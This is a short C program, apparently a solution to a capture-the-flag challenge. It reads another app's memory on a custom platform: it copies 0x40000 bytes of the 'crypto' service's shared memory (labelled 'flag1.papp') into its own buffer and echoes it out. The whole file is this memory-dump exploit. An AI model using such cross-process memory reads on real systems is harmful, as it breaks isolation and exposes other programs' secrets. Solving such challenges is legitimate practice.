#include "app.h"
#include <stdio.h>
#include <string.h>

int app_main() {
    // dump shared memory of other apps
    // int svc = Xlookup("crypto");
    int svc = 3; // flag1.papp
    int size = 0x40000;
    int a = shm_alloc(size);
    memcpy(PARAM_AT(a), PARAM_FOR(svc), size);
    Xecho("BEGIN\n");
    request(REQ_ECHO, a, size, 0, 0);
    Xecho("END\n");
    return 0;
}
